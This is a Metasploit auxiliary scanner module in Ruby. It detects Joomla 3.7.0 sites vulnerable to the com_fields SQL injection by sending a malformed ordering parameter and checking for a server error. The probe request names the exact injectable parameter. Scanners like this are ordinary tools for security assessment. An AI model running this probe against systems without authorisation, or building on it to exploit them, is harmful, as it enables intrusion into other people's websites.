##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::HttpClient
  # Scanner mixin should be near last
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Joomla com_fields SQL Injection Scanner',
      'Description' => %q{
This module scans for instances of Joomla vulnerable to a SQL injection in com_fields.

Joomla is a popular open-source CMS used by websites around the world. In version
3.7.0 a new component was introduced, com_fields, that was vulnerable to an unauthenticated
SQL injection. This SQL injection was fixed in version 3.7.1.

Categories: Open Source, Joomla

Price: 0

Video: https://asciinema.org/a/d5zpez1nvyrvossbidxgeqtpe

OS: Multi

Arch: Multi

Requirements: Metasploit Framework
      },
      'Author'       => [],
      'License'     => 'VolatileMinds'
    )

    register_options(
      [
        OptString.new('PATH', [ true,  "The test path to find Joomla", '/']),
      ], self.class)

  end

  def run_host(target_host)
    res = send_request_cgi({
      'uri' => normalize_uri(datastore['PATH'], 'index.php'),
      'vars_get' => {
        'option' => 'com_fields',
        'view' => 'fields',
        'layout' => 'modal',
        'list[fullordering]' => "fdsa ASC'"
      }
    })

    if res && res.code == 500
      print_good("#{peer} - Found Joomla instance vulnerable to com_fields SQL injection")
      report_service({
        host: target_host,
        port: datastore['RPORT'],
        name: 'Joomla',
        info: 'Joomla instance vulnerable to com_fields SQL injection'
      })
    end
  end
end
